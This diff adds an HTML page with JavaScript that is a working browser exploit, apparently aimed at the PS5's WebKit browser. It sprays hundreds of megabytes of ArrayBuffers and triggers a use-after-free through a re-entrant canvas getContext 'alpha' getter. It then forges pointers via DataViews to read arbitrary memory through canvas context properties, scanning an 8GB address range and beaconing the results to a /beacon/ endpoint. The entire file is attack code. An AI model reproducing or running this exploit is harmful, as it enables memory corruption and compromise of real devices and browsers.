@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V659</title></head>
+<body><pre id="out">V659 — heap spray + crash oracle</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<200;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%200];
+  img.src='/beacon/V659-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
+  _f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+function addrStr(hi,lo){
+  return '0x'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+(lo>>>0).toString(16)).slice(-8);
+}
+function addOff(hi,lo,off){
+  var nlo=lo+off,nhi=hi;
+  while(nlo>=0x100000000){nlo-=0x100000000;nhi++;}
+  while(nlo<0){nlo+=0x100000000;nhi--;}
+  return {hi:nhi,lo:nlo>>>0};
+}
+
+/*
+ * V659 — HEAP SPRAY + CRASH ORACLE
+ * =================================
+ * Problem: 128MB probe grid steps over the heap if mapped region is narrow.
+ * Solution: SPRAY 600MB of ArrayBuffers BEFORE probing. This forces bmalloc/libpas
+ * to COMMIT (PROT_READ|PROT_WRITE) pages across a wide VA range.
+ * 600MB / 128MB = ~4.7 guaranteed slots covered.
+ *
+ * Phase 0: Spray 40x 16MB ABs, touch every 16KB page → 640MB committed
+ * Phase 1: Binary subdivision 8GB at 128MB (same as V658)
+ * Phase 2: On HIT → burst mode scans neighborhood
+ *
+ * OOM budget: WebContent ~1200MB, spray=640MB, UAF ABs=150KB, overhead~200MB = ~1040MB safe
+ */
+
+var SPRAY_COUNT = 40;
+var SPRAY_SIZE = 16 * 1024 * 1024; // 16MB each
+var PAGE_SIZE = 16384; // PS5 = 16KB pages
+
+/* ======= PHASE 0: HEAP SPRAY ======= */
+var sprayABs = [];
+var sprayTotal = 0;
+var sprayFailed = false;
+
+say('Phase 0: Spraying ' + SPRAY_COUNT + 'x 16MB ArrayBuffers...');
+
+for (var si = 0; si < SPRAY_COUNT; si++) {
+  try {
+    var ab = new ArrayBuffer(SPRAY_SIZE);
+    var u8 = new Uint8Array(ab);
+    // Touch every page to force commit
+    for (var pg = 0; pg < SPRAY_SIZE; pg += PAGE_SIZE) {
+      u8[pg] = (si + 1) & 0xFF;
+    }
+    sprayABs.push(ab);
+    sprayTotal += SPRAY_SIZE;
+  } catch(e) {
+    sprayFailed = true;
+    say('  Spray stopped at ' + si + '/' + SPRAY_COUNT + ' (' + (sprayTotal/(1024*1024)) + 'MB) — ' + e.message);
+    break;
+  }
+}
+
+var sprayMB = Math.floor(sprayTotal / (1024*1024));
+if (!sprayFailed) say('  Spray done: ' + sprayMB + 'MB committed');
+bk('SPRAY', 'count=' + sprayABs.length + '|mb=' + sprayMB + '|fail=' + sprayFailed);
+
+/* ======= SCAN CONFIG ======= */
+var STEP = 0x8000000; // 128MB
+var SLOTS = 64;       // 8GB / 128MB
+
+function genOrder(n){
+  var o=[];
+  o.push(0); o.push(n>>>1); o.push(n-1);
+  for(var L=1;L<=6;L++){
+    var div=1<<(L+1),s=Math.floor(n/div);
+    if(s<1)break;
+    for(var k=0;k<(1<<L);k++){
+      var idx=(2*k+1)*s;
+      if(idx>=0&&idx<n&&o.indexOf(idx)===-1)o.push(idx);
+    }
+  }
+  for(var i=0;i<n;i++){if(o.indexOf(i)===-1)o.push(i);}
+  return o;
+}
+
+var slotOrder=genOrder(SLOTS);
+var PROBES=[];
+for(var pi=0;pi<slotOrder.length;pi++){
+  var slot=slotOrder[pi];
+  var a=addOff(1,0,slot*STEP);
+  PROBES.push({hi:a.hi,lo:a.lo,slot:slot,phase:'C'});
+}
+
+/* State */
+var idx=0;
+try{idx=parseInt(localStorage.getItem('v659_idx'))||0;}catch(e){}
+var results=[];
+try{results=JSON.parse(localStorage.getItem('v659_res')||'[]');}catch(e){results=[];}
+var burstDone=false;
+try{burstDone=localStorage.getItem('v659_burst')==='1';}catch(e){}
+
+var hits=results.filter(function(r){return r.s==='H';}).length;
+var misses=results.filter(function(r){return r.s==='M';}).length;
+
+bk('BOOT','i='+idx+'/'+PROBES.length+'|hits='+hits+'|miss='+misses+'|burst='+burstDone+'|spray='+sprayMB+'MB');
+say('Probe '+idx+'/'+PROBES.length+' | Hits:'+hits+' Miss:'+misses+' | Spray:'+sprayMB+'MB');
+
+function saveState(){
+  try{
+    localStorage.setItem('v659_idx',String(idx));
+    localStorage.setItem('v659_res',JSON.stringify(results));
+  }catch(e){}
+}
+
+function doReload(){
+  bk('NEXT','reload');
+  setTimeout(function(){location.reload();},1500);
+}
+
+/* ======= UAF ======= */
+var innerCtx=null,dvs=null,abs=null;
+
+function triggerUAF(){
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var uafOpts={};
+  Object.defineProperty(uafOpts,'alpha',{get:function(){
+    innerCtx=canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer',uafOpts);
+  if(!innerCtx)return false;
+
+  for(var f=0;f<600;f++)new ArrayBuffer(16);
+  abs=new Array(200);
+  dvs=new Array(200);
+  for(var s=0;s<200;s++){
+    abs[s]=new ArrayBuffer(768);
+    dvs[s]=new DataView(abs[s]);
+  }
+  canvas._abs=abs;
+  return true;
+}
+
+function forge(hi,lo){
+  for(var w=0;w<200;w++){
+    dvs[w].setUint32(112,lo>>>0,true);
+    dvs[w].setUint32(116,hi,true);
+    dvs[w].setUint32(120,2,true);
+    dvs[w].setUint32(124,1,true);
+  }
+}
+
+function readAll(){
+  var lw=innerCtx.lineWidth;
+  var ml=-1,ga=-1,sb=-1;
+  try{ml=innerCtx.miterLimit;}catch(e){ml=-888;}
+  try{ga=innerCtx.globalAlpha;}catch(e){ga=-888;}
+  try{sb=innerCtx.shadowBlur;}catch(e){sb=-888;}
+  return {lw:lw,ml:ml,ga:ga,sb:sb};
+}
+
+/* ======= BURST MODE ======= */
+function doBurst(hitHi,hitLo){
+  say('\n=== BURST MODE === around '+addrStr(hitHi,hitLo));
+  bk('BURST-START',addrStr(hitHi,hitLo));
+
+  var BURST_STEP=0x1000000; // 16MB
+  var BURST_RANGE=128;      // ±2GB
+  var burstTargets=[];
+
+  for(var r=1;r<=BURST_RANGE;r++){
+    var fwd=addOff(hitHi,hitLo,r*BURST_STEP);
+    var bck=addOff(hitHi,hitLo,-r*BURST_STEP);
+    if(fwd.hi>=1&&fwd.hi<=9)burstTargets.push(fwd);
+    if(bck.hi>=1&&bck.hi<=9)burstTargets.push(bck);
+  }
+  // Fine scan ±128MB at 1MB
+  for(var m=1;m<=128;m++){
+    var mf=addOff(hitHi,hitLo,m*0x100000);
+    var mb=addOff(hitHi,hitLo,-m*0x100000);
+    burstTargets.push(mf);
+    burstTargets.push(mb);
+  }
+
+  var bi=0,burstHits=0,burstTotal=burstTargets.length;
+
+  function nextBurst(){
+    if(bi>=burstTotal){
+      bk('BURST-DONE','scanned='+bi+'|hits='+burstHits);
+      say('\nBurst complete: '+burstHits+' hits / '+bi+' probes');
+      try{localStorage.setItem('v659_burst','1');}catch(e){}
+      saveState();
+      doReload();
+      return;
+    }
+    var bt=burstTargets[bi];
+    var bAddr=addrStr(bt.hi,bt.lo);
+
+    var dup=false;
+    for(var dd=0;dd<results.length;dd++){if(results[dd].a===bAddr){dup=true;break;}}
+    if(dup){bi++;setTimeout(nextBurst,0);return;}
+
+    results.push({a:bAddr,s:'M',p:'B'});
+    saveState();
+
+    forge(bt.hi,bt.lo);
+    var d=readAll();
+
+    var dataStr='lw='+f2big(d.lw)+'|ml='+f2big(d.ml)+'|ga='+f2big(d.ga)+'|sb='+f2big(d.sb);
+    results[results.length-1]={a:bAddr,s:'H',p:'B',d:dataStr};
+    saveState();
+    burstHits++;
+    bk('BHIT',bAddr+'|'+dataStr);
+    say('  HIT '+bAddr+' '+f2big(d.lw));
+
+    if(bi%20===0){
+      bk('BPROG','i='+bi+'/'+burstTotal+'|hits='+burstHits);
+    }
+    bi++;
+    setTimeout(nextBurst,5);
+  }
+  setTimeout(nextBurst,10);
+}
+
+/* ======= COARSE PROBE ======= */
+if(idx>=PROBES.length){
+  if(hits>0&&!burstDone){
+    var lastHit=null;
+    for(var lh=results.length-1;lh>=0;lh--){
+      if(results[lh].s==='H'&&results[lh].rhi!==undefined){lastHit=results[lh];break;}
+    }
+    if(lastHit&&triggerUAF()){
+      doBurst(lastHit.rhi,lastHit.rlo);
+    } else {
+      bk('DONE','no-burst-target');
+      say('=== COMPLETE (no burst target) ===');
+    }
+  } else {
+    var summary=results.map(function(r){return r.a+':'+r.s;}).join(',');
+    bk('DONE','total='+results.length+'|hits='+hits+'|'+summary.slice(0,800));
+    say('\n=== SCAN COMPLETE ===');
+    results.forEach(function(r){
+      if(r.s==='H') say('  HIT '+r.a+' '+r.d);
+    });
+  }
+} else {
+  var p=PROBES[idx];
+  var pAddr=addrStr(p.hi,p.lo);
+  bk('TGT','i='+idx+'|'+p.phase+'-S'+p.slot+'|'+pAddr+'|spray='+sprayMB);
+  say('-> '+pAddr+' (slot '+p.slot+')');
+
+  results.push({a:pAddr,s:'M',p:'C',rhi:p.hi,rlo:p.lo});
+  idx++;
+  saveState();
+
+  if(!triggerUAF()){
+    bk('FAIL','no-inner');
+    doReload();
+  } else {
+    forge(p.hi,p.lo);
+
+    var lw=innerCtx.lineWidth;
+
+    /* ===== HIT! ===== */
+    var lwB=f2big(lw);
+    bk('HIT','***'+pAddr+'|lw='+lwB+'***');
+    say('*** HIT *** '+pAddr+' lw='+lwB);
+
+    var d=readAll();
+    var dataStr='lw='+lwB+'|ml='+f2big(d.ml)+'|ga='+f2big(d.ga)+'|sb='+f2big(d.sb);
+    bk('DATA',pAddr+'|'+dataStr);
+
+    results[results.length-1]={a:pAddr,s:'H',p:'C',d:dataStr,rhi:p.hi,rlo:p.lo};
+    saveState();
+
+    say('\nHIT found! Entering burst mode...');
+    doBurst(p.hi,p.lo);
+  }
+}
+</script>
+</body></html>
